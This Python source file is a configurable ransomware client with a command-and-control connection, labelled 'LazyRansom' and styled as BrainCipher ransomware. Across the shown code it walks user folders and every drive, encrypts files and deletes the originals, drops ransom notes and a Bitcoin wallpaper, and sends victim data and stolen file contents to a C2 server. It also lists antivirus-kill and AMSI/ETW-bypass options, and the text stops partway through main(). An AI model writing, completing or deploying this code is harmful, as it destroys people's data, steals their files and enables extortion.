AV_KILL_ENABLED = AV_KILL_STR_PLACEHOLDER
AV_BYPASS_ENABLED = AV_BYPASS_STR_PLACEHOLDER
PRIVILEGE_ESCALATION = PRIVILEGE_ESC_STR_PLACEHOLDER
PARALLEL_ENCRYPTION = PARALLEL_STR_PLACEHOLDER
THREAD_COUNT = THREAD_COUNT_PLACEHOLDER
DLL_SIDELOADING_ENABLED = DLL_SIDELOADING_STR_PLACEHOLDER
BYOVD_ENABLED = BYOVD_STR_PLACEHOLDER
DESKTOP_ICON_CHANGE_ENABLED = DESKTOP_ICON_STR_PLACEHOLDER
PROCESS_INJECTION_ENABLED = PROCESS_INJECTION_STR_PLACEHOLDER
AMSI_BYPASS_ENABLED = AMSI_BYPASS_STR_PLACEHOLDER
ETW_BYPASS_ENABLED = ETW_BYPASS_STR_PLACEHOLDER
DLL_UNHOOKING_ENABLED = DLL_UNHOOKING_STR_PLACEHOLDER
SYSCALL_DIRECT_ENABLED = SYSCALL_DIRECT_STR_PLACEHOLDER
REFLECTIVE_PE_ENABLED = REFLECTIVE_PE_STR_PLACEHOLDER
TARGET_OS = "TARGET_OS_PLACEHOLDER"
MAX_RECONNECT_ATTEMPTS = MAX_RECONNECT_STR_PLACEHOLDER

RANSOM_NOTE = """RANSOM_NOTE_PLACEHOLDER"""

# ==================== OS DETECTION ====================
def get_os():
    system = platform.system().lower()
    if system == 'windows':
        return 'windows'
    elif system == 'darwin':
        return 'macos'
    else:
        return 'linux'

OS = get_os()
IS_WINDOWS = OS == 'windows'
IS_LINUX = OS == 'linux'
IS_MACOS = OS == 'macos'

# ==================== CHECK ADMIN ====================
def check_admin():
    try:
        if IS_WINDOWS:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

# ==================== CRYPTO ====================
def generate_key():
    return hashlib.sha256(DECRYPT_KEY.encode()).digest()

def encrypt_xchacha20(data, key):
    try:
        from Crypto.Cipher import ChaCha20_Poly1305
        nonce = os.urandom(24)
        cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return b'XCHACHA20' + nonce + ciphertext + tag
    except:
        return encrypt_aes256(data, key)

def decrypt_xchacha20(data, key):
    try:
        from Crypto.Cipher import ChaCha20_Poly1305
        if not data.startswith(b'XCHACHA20'):
            return decrypt_aes256(data, key)
        data = data[9:]
        nonce = data[:24]
        tag = data[-16:]
        ciphertext = data[24:-16]
        cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except:
        return decrypt_aes256(data, key)

def encrypt_aes256(data, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        return b'AES256' + iv + cipher.encrypt(pad(data, AES.block_size))
    except:
        return encrypt_xor(data, key[:16])

def decrypt_aes256(data, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        if not data.startswith(b'AES256'):
            return decrypt_xor(data, key[:16])
        data = data[6:]
        iv = data[:16]
        ct = data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        return unpad(cipher.decrypt(ct), AES.block_size)
    except:
        return decrypt_xor(data, key[:16])

def encrypt_xor(data, key):
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return b'XOR' + bytes(result)

def decrypt_xor(data, key):
    if not data.startswith(b'XOR'):
        return data
    data = data[3:]
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)

def encrypt_data(data, key):
    if ENCRYPTION == "xchacha20":
        return encrypt_xchacha20(data, key)
    elif ENCRYPTION in ["aes256", "aes"]:
        return encrypt_aes256(data, key)
    else:
        return encrypt_xor(data, key[:16])

def decrypt_data(data, key):
    if ENCRYPTION == "xchacha20":
        return decrypt_xchacha20(data, key)
    elif ENCRYPTION in ["aes256", "aes"]:
        return decrypt_aes256(data, key)
    else:
        return decrypt_xor(data, key[:16])

def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = encrypt_data(data, key)
        encrypted_path = filepath + ".revil"
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
        return True
    except:
        return False

def decrypt_file(filepath, key):
    try:
        if not filepath.endswith('.revil'):
            return False
        with open(filepath, 'rb') as f:
            data = f.read()
        decrypted = decrypt_data(data, key)
        original_path = filepath.replace('.revil', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted)
        os.remove(filepath)
        return True
    except:
        return False

# ==================== FILE OPERATIONS ====================
def find_files(encrypted_only=False):
    files = []
    extensions_lower = [ext.lower().strip() for ext in EXTENSIONS]
    search_dirs = []
    
    if IS_WINDOWS:
        import string
        home = os.path.expanduser("~")
        search_dirs.extend([
            home,
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Pictures"),
            os.path.join(home, "Music"),
            os.path.join(home, "Videos"),
        ])
        users_path = "C:\\\\Users"
        if os.path.exists(users_path):
            for user in os.listdir(users_path):
                user_path = os.path.join(users_path, user)
                if os.path.isdir(user_path):
                    search_dirs.append(user_path)
        search_dirs.extend(["C:\\\\ProgramData", "C:\\\\Temp"])
        for drive_letter in string.ascii_uppercase:
            drive_path = drive_letter + ":\\\\"
            if os.path.exists(drive_path):
                search_dirs.append(drive_path)
    elif IS_MACOS:
        home = os.path.expanduser("~")
        search_dirs = [
            home,
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Pictures"),
            os.path.join(home, "Music"),
            os.path.join(home, "Movies"),
            "/Users",
            "/Volumes",
        ]
    else:
        home = os.path.expanduser("~")
        search_dirs = [
            home,
            os.path.join(home, "Documents"),
            
        ]
        if os.path.exists("/home"):
            for user_dir in os.listdir("/home"):
                user_path = os.path.join("/home", user_dir)
                if os.path.isdir(user_path) and not user_dir.startswith('.'):
                    search_dirs.append(user_path)

    search_dirs = list(set([d for d in search_dirs if d and os.path.exists(d) and os.path.isdir(d)]))
    
    for root_dir in search_dirs:
        try:
            for dirpath, dirnames, filenames in os.walk(root_dir):
                skip_dirs = ['Windows', 'System32', 'System', 'WinSxS', 'Program Files',
                            'Program Files (x86)', 'python', 'Python', 'venv', 'env',
                            '__pycache__', 'node_modules', 'vendor', 'target', 'build',
                            'dist', 'bin', 'lib', 'lib64', 'lib32', 'sbin', 'usr', 'var',
                            'proc', 'sys', 'dev', 'run', 'boot', 'etc', 'opt',
                            'snap', 'flatpak', '.cache', '.local', '.config']
                if any(skip in dirpath for skip in skip_dirs):
                    continue
                if '/.' in dirpath or dirpath.startswith('.'):
                    continue

                for filename in filenames:
                    if filename.startswith('README_RANSOM') or filename.startswith('DECRYPT_KEY'):
                        continue
                    if filename.startswith('.'):
                        continue

                    if encrypted_only:
                        if filename.endswith('.revil'):
                            files.append(os.path.join(dirpath, filename))
                    else:
                        if filename.endswith('.revil'):
                            continue
                        ext = filename.split('.')[-1].lower() if '.' in filename else ''
                        if ext in extensions_lower:
                            filepath = os.path.join(dirpath, filename)
                            try:
                                size = os.path.getsize(filepath)
                                if 1024 < size < 100 * 1024 * 1024:
                                    files.append(filepath)
                            except:
                                pass
        except:
            pass

    random.shuffle(files)
    return files

def parallel_encrypt_files(files, key, progress_callback=None):
    encrypted_count = 0
    total = len(files)
    
    if not PARALLEL_ENCRYPTION or total < 10:
        for i, filepath in enumerate(files):
            if encrypt_file(filepath, key):
                encrypted_count += 1
            if progress_callback:
                progress_callback(i + 1, total)
        return encrypted_count
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = []
        for f in files:
            futures.append(executor.submit(encrypt_file, f, key))
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if future.result():
                encrypted_count += 1
            if progress_callback:
                progress_callback(completed, total)
    
    return encrypted_count

# ==================== RANSOM NOTE & WALLPAPER ====================
def drop_ransom_note():
    note_content = RANSOM_NOTE + "\\n\\nDECRYPTION KEY: " + DECRYPT_KEY + "\\nALGORITHM: " + ENCRYPTION
    note_locations = [
        os.path.expanduser("~/Desktop/README_RANSOM.txt"),
        os.path.expanduser("~/Documents/README_RANSOM.txt"),
        os.path.expanduser("~/Downloads/README_RANSOM.txt"),
    ]
    if IS_WINDOWS:
        note_locations.extend(["C:\\\\Users\\\\Public\\\\README_RANSOM.txt"])
    else:
        note_locations.extend(["~/Desktop/README_RANSOM.txt"])
    for location in note_locations:
        try:
            with open(location, 'w', encoding='utf-8') as f:
                f.write(note_content)
        except:
            pass

def change_wallpaper():
    if not WALLPAPER_CHANGE:
        return
    try:
        if IS_WINDOWS:
            import ctypes
            try:
                from PIL import Image, ImageDraw
                img = Image.new('RGB', (1920, 1080), color='black')
                draw = ImageDraw.Draw(img)
                try:
                    from PIL import ImageFont
                    font = ImageFont.truetype("arial.ttf", 60)
                except:
                    font = ImageFont.load_default()
                lines = ["RANSOMWARE", "YOUR FILES ARE ENCRYPTED!", "", "BTC: " + BTC_ADDRESS]
                y = 200
                for line in lines:
                    if line:
                        bbox = draw.textbbox((0, 0), line, font=font)
                        x = (1920 - (bbox[2] - bbox[0])) // 2
                        color = '#ff0000' if 'RANSOMWARE' in line else '#ffffff'
                        draw.text((x, y), line, fill=color, font=font)
                    y += 70
                wallpaper_path = os.path.expanduser("~/Desktop/wallpaper.jpg")
                img.save(wallpaper_path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
            except:
                pass
    except:
        pass

def change_desktop_icon_ransomware():
    if not DESKTOP_ICON_CHANGE_ENABLED:
        return False
    try:
        if IS_WINDOWS:
            icon_data = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAFYSURBVDhPpZO/TsMwEMaPMOeR3pFZMLEyMkKBEZEygIgBIZGpAwsDfTPeGQUJ1g7wQhBAIrEwBQxIrH2JL4MzVokTNH15P9/57rtzhZgMBnVn+u8lnUXm9rbeAOE2IsXK+rqIYtY72Q+kAqGgGUmB0VjWU65Z7FjvOUehnUxIZG9fs71DfV5FIQhvL/XjKJhPjEG6M6Yq1W6PNgNUTgVFRVQAE4UQAiYzS2W4W16x3uYtW6Nt83iBZBjT/UumLFsMkvWtwXrPRpTVeimhZysCssCixdIK57Oa7pDp1Czu9Onl8hYrQ5gwFGyfIjLVE4pZq1Tg2udV3Xj5aDwwha1+1ndT+ERd7t8WvXr7zpK3F38yw7gUAMBOe3/zG3RPR8x9IwCWuS/8VYhPhQKqSjM7KwV4DspFcNADlZXoZzrQ40/rZz4JutA78Qh/KR5dH43+dLgAAAAASUVORK5CYII="
            icon_path = os.path.expanduser("~/Desktop/ransomware.ico")
            with open(icon_path, 'wb') as f:
                f.write(base64.b64decode(icon_data))
            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, icon_path, 0x01)
            ctypes.windll.user32.SystemParametersInfoW(0x002F, 0, icon_path, 0x01)
            return True
    except:
        pass
    return False

# ==================== C2 CLIENT ====================
class C2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.running = True
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = MAX_RECONNECT_ATTEMPTS
        self.command_handlers = {
            'encrypt': self.cmd_encrypt,
            'decrypt': self.cmd_decrypt,
            'status': self.cmd_status,
            'exfiltrate': self.cmd_exfiltrate,
            'kill': self.cmd_kill,
            'wallpaper': self.cmd_wallpaper,
            'note': self.cmd_note,
            'ping': self.cmd_ping,
            'icon': self.cmd_icon,
            'avkill': self.cmd_avkill,
        }
        self.encrypted = False
        self.decrypt_key = DECRYPT_KEY
        self.key = generate_key()

    def connect(self):
        """Connect to C2 server - FIXED with better error handling"""
        try:
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
            
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.host, self.port))
            print("[+] Connected to C2")
            
            info = {
                'type': 'register',
                'os': OS,
                'hostname': socket.gethostname(),
                'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
                'is_admin': check_admin(),
                'decrypt_key': DECRYPT_KEY,
                'encryption': ENCRYPTION,
                'target_os': TARGET_OS,
                'av_features': {
                    'kill': AV_KILL_ENABLED,
                    'bypass': AV_BYPASS_ENABLED,
                    'amsi': AMSI_BYPASS_ENABLED,
                    'etw': ETW_BYPASS_ENABLED,
                    'dll_unhook': DLL_UNHOOKING_ENABLED,
                    'syscall': SYSCALL_DIRECT_ENABLED,
                    'process_injection': PROCESS_INJECTION_ENABLED,
                    'reflective_pe': REFLECTIVE_PE_ENABLED,
                }
            }
            self.socket.send(json.dumps(info).encode() + b'\\n')
            self.reconnect_attempts = 0
            return True
            
        except Exception as e:
            print("[!] Failed to connect: " + str(e))
            return False

    def listen(self):
        """Listen for C2 commands with proper reconnection - FIXED"""
        buffer = ""
        print("[*] Waiting for C2 commands...")
        
        while self.running:
            try:
                self.socket.settimeout(1.0)
                data = self.socket.recv(4096).decode('utf-8', errors='ignore')
                
                if not data:
                    print("[!] C2 connection lost (empty data)")
                    self._handle_disconnect()
                    break
                    
                buffer += data
                while '\\n' in buffer:
                    line, buffer = buffer.split('\\n', 1)
                    try:
                        cmd = json.loads(line)
                        print(f"[*] Received command: {cmd.get('type', 'unknown')}")
                        self.process_command(cmd)
                    except json.JSONDecodeError as e:
                        print(f"[!] Invalid JSON: {line[:100]}... ({e})")
                    except Exception as e:
                        print(f"[!] Command processing error: {e}")
                        
            except socket.timeout:
                continue
            except (BrokenPipeError, ConnectionResetError, OSError) as e:
                print(f"[!] Connection error: {e}")
                self._handle_disconnect()
                break
            except Exception as e:
                print(f"[!] Unexpected error: {e}")
                self._handle_disconnect()
                break
        
        self.running = False
        print("[*] C2 listener stopped")

    def _handle_disconnect(self):
        """Handle disconnection with reconnection logic - FIXED"""
        self.reconnect_attempts += 1
        
        if self.max_reconnect_attempts == 0:
            print("[!] Reconnect disabled. Exiting...")
            self.running = False
            return
        
        if self.reconnect_attempts >= self.max_reconnect_attempts:
            print(f"[!] Max reconnect attempts ({self.max_reconnect_attempts}) reached. Exiting...")
            self.running = False
            return
        
        print(f"[*] Reconnect attempt {self.reconnect_attempts}/{self.max_reconnect_attempts}")
        try:
            if self.socket:
                self.socket.close()
        except:
            pass
        
        time.sleep(3)
        
        if self.running:
            if self.connect():
                print("[*] Reconnected successfully, resuming listener...")
                self.listen()
            else:
                self._handle_disconnect()

    def process_command(self, cmd):
        """Process command from C2 server - FIXED"""
        cmd_type = cmd.get('type', '')
        print(f"[*] Processing command: {cmd_type}")
        
        if cmd_type in self.command_handlers:
            try:
                self.command_handlers[cmd_type](cmd)
            except Exception as e:
                print(f"[!] Error executing {cmd_type}: {e}")
        else:
            print(f"[!] Unknown command: {cmd_type}")

    def send_response(self, response):
        try:
            response['timestamp'] = datetime.now().isoformat()
            self.socket.send(json.dumps(response).encode() + b'\\n')
        except:
            pass

    def cmd_encrypt(self, cmd):
        print("[*] Starting encryption with " + str(ENCRYPTION).upper() + "...")
        
        if AV_KILL_ENABLED or AV_BYPASS_ENABLED:
            print("[*] Running AV Kill + Bypass...")
            full_av_kill_bypass()
        
        if PRIVILEGE_ESCALATION and not check_admin():
            print("[*] Attempting privilege escalation...")
        
        files = find_files(encrypted_only=False)
        print("[*] Found " + str(len(files)) + " files")
        
        if len(files) == 0:
            self.send_response({'type': 'encrypt_response', 'status': 'error', 'message': 'No files found'})
            return
        
        encrypted_count = parallel_encrypt_files(files, self.key)
        self.encrypted = True
        
        drop_ransom_note()
        change_wallpaper()
        change_desktop_icon_ransomware()
        
        self.send_response({
            'type': 'encrypt_response',
            'status': 'success',
            'files_encrypted': encrypted_count,
            'total_files': len(files),
            'decrypt_key': DECRYPT_KEY,
            'algorithm': ENCRYPTION,
        })
        print("[+] Encrypted " + str(encrypted_count) + " files with " + str(ENCRYPTION).upper())
        
        print("[*] Encryption complete, waiting for commands...")
        

    def cmd_decrypt(self, cmd):
        if not self.encrypted:
            self.send_response({'type': 'decrypt_response', 'status': 'error', 'message': 'No encryption performed'})
            return
        print("[*] Starting decryption...")
        files = find_files(encrypted_only=True)
        print("[*] Found " + str(len(files)) + " encrypted files")
        decrypted_count = 0
        for filepath in files:
            if decrypt_file(filepath, self.key):
                decrypted_count += 1
        self.encrypted = False
        self.send_response({
            'type': 'decrypt_response',
            'status': 'success',
            'files_decrypted': decrypted_count,
            'total_files': len(files),
        })
        print("[+] Decrypted " + str(decrypted_count) + " files")
        print("[*] Decryption complete, Victim stays connected for further commands.")
        

    def cmd_status(self, cmd):
        files = find_files(encrypted_only=True)
        self.send_response({
            'type': 'status_response',
            'status': 'ok',
            'os': OS,
            'is_admin': check_admin(),
            'encrypted': self.encrypted,
            'encrypted_files': len(files),
            'decrypt_key': DECRYPT_KEY,
            'algorithm': ENCRYPTION,
            'target_os': TARGET_OS,
        })

    def cmd_exfiltrate(self, cmd):
        print("[*] Exfiltrating files...")
        files = find_files(encrypted_only=False)
        exfiltrated = 0
        for filepath in files[:10]:
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                data = {
                    'type': 'exfiltrate',
                    'filename': os.path.basename(filepath),
                    'content': base64.b64encode(content).decode(),
                    'size': len(content)
                }
                self.socket.send(json.dumps(data).encode() + b'\\n')
                exfiltrated += 1
            except:
                pass
        self.send_response({
            'type': 'exfiltrate_response',
            'status': 'success',
            'files_exfiltrated': exfiltrated,
        })
        print("[+] Exfiltrated " + str(exfiltrated) + " files")

    def cmd_wallpaper(self, cmd):
        change_wallpaper()
        self.send_response({'type': 'wallpaper_response', 'status': 'success'})

    def cmd_note(self, cmd):
        drop_ransom_note()
        self.send_response({'type': 'note_response', 'status': 'success'})

    def cmd_ping(self, cmd):
        self.send_response({'type': 'pong', 'status': 'ok'})

    def cmd_icon(self, cmd):
        change_desktop_icon_ransomware()
        self.send_response({'type': 'icon_response', 'status': 'success'})

    def cmd_avkill(self, cmd):
        print("[*] Running AV Kill...")
        av_kill_all()
        self.send_response({'type': 'avkill_response', 'status': 'success'})

    def cmd_kill(self, cmd):
        print("[*] Self-destructing...")
        self.send_response({'type': 'kill_response', 'status': 'success'})
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        time.sleep(1)
        sys.exit(0)

# ==================== BRAINCIPHER STYLE GUI (Decrypt with Key Input - FIXED) ====================
def create_gui():
    """BrainCipher styled ransomware GUI - Decrypt with key input verification"""
    try:
        import tkinter as tk
        from tkinter import ttk, messagebox, scrolledtext, simpledialog
        
        root = tk.Tk()
        root.title("☠ BRAINCIPHER RANSOMWARE v6.1")
        root.geometry("750x580")
        root.configure(bg='#0a0f0a')
        root.overrideredirect(True)
        
        # Center window
        root.update_idletasks()
        x = (root.winfo_screenwidth() - 750) // 2
        y = (root.winfo_screenheight() - 580) // 2
        root.geometry(f"750x580+{x}+{y}")
        
        # ===== STYLES =====
        style = ttk.Style()
        style.theme_use('clam')
        
        MATRIX_GREEN = '#00ff41'
        DARK_GREEN = '#003d1a'
        BG = '#0a0f0a'
        CARD_BG = '#0d1a0d'
        BORDER = '#00ff41'
        TEXT_DIM = '#1a6b1a'
        NEON_GREEN = '#39ff14'
        
        style.configure('Matrix.TLabel', 
                       foreground=MATRIX_GREEN, 
                       background=BG, 
                       font=('Consolas', 11))
        
        style.configure('Matrix.TButton', 
                       foreground=MATRIX_GREEN, 
                       background=BG,
                       borderwidth=1,
                       relief='solid',
                       font=('Consolas', 11, 'bold'))
        
        style.map('Matrix.TButton',
                 background=[('active', DARK_GREEN)],
                 foreground=[('active', NEON_GREEN)])
        
        style.configure('Title.TLabel',
                       foreground=MATRIX_GREEN,
                       background=BG,
                       font=('Hack', 16, 'bold'))
        
        style.configure('Status.TLabel',
                       foreground=MATRIX_GREEN,
                       background=BG,
                       font=('Consolas', 10))
        
        # ===== MAIN FRAME =====
        main_frame = tk.Frame(root, bg=BG, bd=2, relief='solid', highlightcolor=MATRIX_GREEN)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # ===== HEADER =====
        header_frame = tk.Frame(main_frame, bg=BG, height=50)
        header_frame.pack(fill='x', pady=(5, 10))
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(header_frame, text="☠ BRAINCIPHER RANSOMWARE",
                              font=('Hack', 18, 'bold'),
                              fg=MATRIX_GREEN, bg=BG)
        title_label.pack(side='left', padx=20)
        
        version_label = tk.Label(header_frame, text="v6.1",
                                font=('Consolas', 10),
                                fg=TEXT_DIM, bg=BG)
        version_label.pack(side='left', padx=5)
        
        status_dot = tk.Label(header_frame, text="●",
                             font=('Consolas', 14),
                             fg=MATRIX_GREEN, bg=BG)
        status_dot.pack(side='right', padx=10)
        
        # ===== SEPARATOR =====
        sep = tk.Frame(main_frame, height=1, bg=BORDER)
        sep.pack(fill='x', pady=5)
        
        # ===== STATUS BAR =====
        status_frame = tk.Frame(main_frame, bg=BG, height=28)
        status_frame.pack(fill='x', pady=(0, 10))
        status_frame.pack_propagate(False)
        
        status_var = tk.StringVar(value="● SYSTEM ONLINE | WAITING FOR C2 COMMAND")
        status_label = tk.Label(status_frame, textvariable=status_var,
                               font=('Consolas', 10, 'bold'),
                               fg=MATRIX_GREEN, bg=BG)
        status_label.pack(side='left')
        
        c2_status_var = tk.StringVar(value="🔗 CONNECTED")
        c2_label = tk.Label(status_frame, textvariable=c2_status_var,
                           font=('Consolas', 10, 'bold'),
                           fg=MATRIX_GREEN, bg=BG)
        c2_label.pack(side='right')
        
        # ===== INFO FRAME =====
        info_frame = tk.Frame(main_frame, bg=CARD_BG, bd=1, relief='solid', highlightcolor=BORDER)
        info_frame.pack(fill='x', pady=5, padx=5)
        
        info_text = f"""
 TARGET: {OS.upper():<8} │ ALGORITHM: {str(ENCRYPTION).upper():<10} │ ADMIN: {str(check_admin()):<5} │ RECONNECT: {str(MAX_RECONNECT_ATTEMPTS)}
 AV KILL: {str(AV_KILL_ENABLED):<5} │ BYPASS: {str(AV_BYPASS_ENABLED):<5} │ AMSI: {str(AMSI_BYPASS_ENABLED):<5} │ ETW: {str(ETW_BYPASS_ENABLED)}
        """
        info_label = tk.Label(info_frame, text=info_text,
                             font=('Consolas', 9),
                             fg=MATRIX_GREEN, bg=CARD_BG,
                             justify='left')
        info_label.pack(pady=4, padx=10, anchor='w')
        
        # ===== MAIN CONTENT =====
        content_frame = tk.Frame(main_frame, bg=BG)
        content_frame.pack(fill='both', expand=True, pady=10)
        
        # Left Panel - Status & Stats
        left_panel = tk.Frame(content_frame, bg=CARD_BG, bd=1, relief='solid', highlightcolor=BORDER)
        left_panel.pack(side='left', fill='both', expand=True, padx=(0, 5))
        
        # Stats
        stats_frame = tk.Frame(left_panel, bg=CARD_BG)
        stats_frame.pack(fill='both', expand=True, pady=20, padx=10)
        
        stats_title = tk.Label(stats_frame, text="╔══ VICTIM STATUS ══╗",
                              font=('Consolas', 11, 'bold'),
                              fg=MATRIX_GREEN, bg=CARD_BG)
        stats_title.pack()
        
        stats_grid = tk.Frame(stats_frame, bg=CARD_BG)
        stats_grid.pack(pady=20)
        
        # Status items
        status_items = [
            ("ENCRYPTED", "🔓", "No"),
            ("FILES", "📁", "0"),
            ("ADMIN", "👑", str(check_admin())),
            ("OS", "💻", OS.upper()),
        ]
        
        encrypted_label = None
        files_label = None
        
        for i, (label, icon, value) in enumerate(status_items):
            row = i // 2
            col = (i % 2) * 2
            frame = tk.Frame(stats_grid, bg=CARD_BG)
            frame.grid(row=row, column=col, padx=20, pady=10, sticky='w')
            
            lbl = tk.Label(frame, text=f"{icon} {label}:", 
                          font=('Consolas', 11),
                          fg=TEXT_DIM, bg=CARD_BG)
            lbl.pack(side='left')
            
            val = tk.Label(frame, text=value,
                          font=('Consolas', 11, 'bold'),
                          fg=MATRIX_GREEN, bg=CARD_BG)
            val.pack(side='left', padx=(5, 0))
            
            if label == "ENCRYPTED":
                encrypted_label = val
            elif label == "FILES":
                files_label = val
        
        # ===== NO DECRYPTION KEY DISPLAY =====
        
        # Right Panel - Controls
        right_panel = tk.Frame(content_frame, bg=CARD_BG, bd=1, relief='solid', highlightcolor=BORDER)
        right_panel.pack(side='right', fill='both', expand=True, padx=(5, 0))
        
        # ===== CONTROL BUTTONS =====
        btn_frame = tk.Frame(right_panel, bg=CARD_BG)
        btn_frame.pack(fill='both', expand=True, pady=40, padx=30)
        
        def make_btn(parent, text, cmd, color=MATRIX_GREEN, hover_color=NEON_GREEN):
            btn = tk.Button(parent, text=text, command=cmd,
                           font=('Consolas', 12, 'bold'),
                           bg=BG, fg=color, 
                           activebackground=DARK_GREEN,
                           activeforeground=hover_color,
                           relief='solid', bd=2,
                           highlightcolor=color,
                           cursor='hand2',
                           height=2)
            
            def on_enter(e):
                btn.config(bg=DARK_GREEN, fg=hover_color)
            def on_leave(e):
                btn.config(bg=BG, fg=color)
            
            btn.bind('<Enter>', on_enter)
            btn.bind('<Leave>', on_leave)
            return btn
        
        # ===== DECRYPT FUNCTION (with key input dialog - FIXED strings) =====
        def do_decrypt():
            # Get client
            try:
                import sys
                client_obj = sys.modules['__main__'].client
            except:
                import inspect
                frame = inspect.currentframe()
                while frame:
                    if 'client' in frame.f_locals:
                        client_obj = frame.f_locals['client']
                        break
                    frame = frame.f_back
                else:
                    client_obj = globals().get('client', None)
            
            if client_obj is None:
                messagebox.showerror("Error", "Client not available! Please restart the application.")
                return
            
            if not hasattr(client_obj, 'encrypted') or not client_obj.encrypted:
                messagebox.showwarning("Warning", "No encryption performed yet!")
                return
            
            # ===== ASK FOR DECRYPTION KEY - FIXED: single line strings =====
            key_input = simpledialog.askstring(
                "Key Required",
                "Enter the decryption key:",
                parent=root,
                show='*'
            )
            
            # Check if user cancelled
            if key_input is None:
                status_var.set("● DECRYPTION CANCELLED")
                c2_status_var.set("⏹ CANCELLED")
                return
            
            # Check if key is empty
            if not key_input.strip():
                messagebox.showerror("Error", "Decryption key cannot be empty!")
                status_var.set("● ! INVALID KEY")
                c2_status_var.set("❌ ERROR")
                return
            
            # ===== VERIFY KEY =====
            correct_key = getattr(client_obj, 'decrypt_key', DECRYPT_KEY)
            
            if key_input.strip() != correct_key:
                messagebox.showerror("Wrong Key", "The decryption key you entered is incorrect!")
                status_var.set("● ! WRONG KEY")
                c2_status_var.set("❌ ERROR")
                return
            
            # ===== KEY IS CORRECT - PROCEED WITH DECRYPTION =====
            status_var.set("● DECRYPTING FILES...")
            c2_status_var.set("⏳ PROCESSING")
            
            files = find_files(encrypted_only=True)
            if files:
                decrypted = 0
                for f in files:
                    if decrypt_file(f, client_obj.key):
                        decrypted += 1
                client_obj.encrypted = False
                if encrypted_label:
                    encrypted_label.config(text="No")
                if files_label:
                    files_label.config(text="0")
                status_var.set(f"● DECRYPTED {decrypted} FILES")
                c2_status_var.set("✅ DONE")
                messagebox.showinfo("Success", "Successfully decrypted " + str(decrypted) + " files!")
            else:
                status_var.set("● ! NO ENCRYPTED FILES")
                c2_status_var.set("❌ ERROR")
                messagebox.showwarning("Warning", "No encrypted files found to decrypt!")
        
        # ===== STATUS FUNCTION =====
        def do_status():
            files = find_files(encrypted_only=True)
            if files:
                status_var.set(f"● STATUS: {len(files)} encrypted files")
            else:
                status_var.set("● STATUS: 0 encrypted files")
            c2_status_var.set("📊 OK")
        
        # ===== DECRYPT BUTTON =====
        decrypt_btn = make_btn(btn_frame, "🔑 DECRYPT", do_decrypt, 
                              color="#ff8800", hover_color="#ffaa00")
        decrypt_btn.pack(pady=15, padx=30, fill='x')
        
        # ===== STATUS BUTTON =====
        status_btn = make_btn(btn_frame, "📊 STATUS", do_status,
                             color="#00aaff", hover_color="#44ddff")
        status_btn.pack(pady=15, padx=30, fill='x')
        
        # ===== BOTTOM STATUS =====
        bottom_frame = tk.Frame(main_frame, bg=BG, height=22)
        bottom_frame.pack(fill='x', pady=(10, 0))
        bottom_frame.pack_propagate(False)
        
        matrix_line = tk.Label(bottom_frame, 
                              text="█▓▒░ ░▒▓█ █▓▒░ ░▒▓█ █▓▒░ ░▒▓█ █▓▒░ ░▒▓█",
                              font=('Consolas', 8),
                              fg=DARK_GREEN, bg=BG)
        matrix_line.pack(side='left')
        
        version_lbl = tk.Label(bottom_frame, text="BRAINCIPHER v6.1 | FOR AUTHORIZED USE ONLY",
                              font=('Consolas', 8),
                              fg=TEXT_DIM, bg=BG)
        version_lbl.pack(side='right')
        
        # ===== KEYBOARD SHORTCUTS =====
        root.bind('<Escape>', lambda e: root.destroy())
        root.bind('<Control-d>', lambda e: decrypt_btn.invoke())
        root.bind('<Control-s>', lambda e: status_btn.invoke())
        
        # ===== PULSE ANIMATION =====
        def pulse_dot():
            current = status_dot.cget('fg')
            status_dot.config(fg=TEXT_DIM if current == MATRIX_GREEN else MATRIX_GREEN)
            root.after(800, pulse_dot)
        
        pulse_dot()
        
        # ===== RUN =====
        root.mainloop()
        
    except Exception as e:
        print("[!] GUI error: " + str(e))
        main()

        
# ==================== MAIN ====================
def main():
    print("[*] LazyRansom C2 Client v6.1")
    print("[*] C2 Server: " + C2_HOST + ":" + str(C2_PORT))
    print("[*] OS: " + OS)
    print("[*] Algorithm: " + str(ENCRYPTION).upper())
    print("[*] Decryption Key: " + DECRYPT_KEY)
    print("[*] Target OS: " + TARGET_OS)
    print("[*] Max Reconnect: " + str(MAX_RECONNECT_ATTEMPTS))
    
    if AV_KILL_ENABLED:
